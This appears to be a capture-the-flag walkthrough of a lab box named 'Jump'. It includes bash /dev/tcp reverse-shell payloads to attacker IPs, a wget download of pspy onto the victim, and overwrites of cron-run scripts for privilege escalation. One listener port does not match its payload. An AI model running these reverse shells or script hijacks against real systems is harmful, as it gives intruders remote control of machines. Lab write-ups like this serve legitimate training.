#Jump

At first I scan with nmap 

```cmd
nmap -sC -sV ip
```

![alt text](/P/jump.png)

I login using anonymous mood 

```cmd
ftp anonoymous@ip
```

![alt text](/P/jump1.png)

Not see anything in README.txt

so I crate a reverse file 

```cmd
nano rev.sh

#!/bin/bash
bash -i >& /dev/tcp/10.48.110.196/1234 0>&1

```

In another terminal listen netcat

```cmd
nc -lvnp 1234
``` 

Get flag

![alt text](/P/jump2.png)

Now try to login to dev_user. First need to create pspy64 using python server

First download pspy64 

```cmd
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
```

and then create python server

```cmd
python3 -m http.server 8000
```

And then in victim machine download the pspy64 

```cmd
wget http://<ATTACKER_IP>:8000/pspy64
```
set the permission to use

```cmd
chmod +x ./pspy64
```

Run the file 

```cmd
./pspy64
```

found

![alt text](/P/jump3.png)

fix the file 

![alt text](/P/jump4.png)

use 
```cmd
nc -lvnp 4445
```

get this

![alt text](/P/jump5.png)


And then search dev_user flag

![alt text](/P/jump6.png)

For monitor_user flag

Check again with pspy64 

Find this 

![alt text](/P/jump7.png)

Add 
```cmd
mkdir -p /opt/dev/bin
cat << 'EOF' > /opt/dev/bin/ps
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.48.106.242/4446 0>&1
EOF
```

Fix the permission
```cmd
chmod +x /opt/dev/bin/ps
ls -la /opt/dev/bin/ps
```

![alt text](/P/jump8.png)

For ops_user

![alt text](/P/jump9.png)

Enter this file and find this 

This mean if run deploy.sh also call to run this ./deploy_helper.sh

![alt text](/P/jump10.png)

add the command 

```cmd
cat << 'EOF' > /opt/app/deploy_helper.sh
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.48.106.242/4448 0>&1
EOF
chmod +x /opt/app/deploy_helper.sh
```

Run like this 

![alt text](/P/jump11.png)

and Listen 

```cmd
nc -lvnp 6060
```

Go to the home and find flag

![alt text](/P/jump12.png)

For root flag

I found in root of less file 

![alt text](/P/jump13.png)

ops_user can run without password and can see the rootflag.txt file 

and found the flag

![alt text](/P/jump14.png)

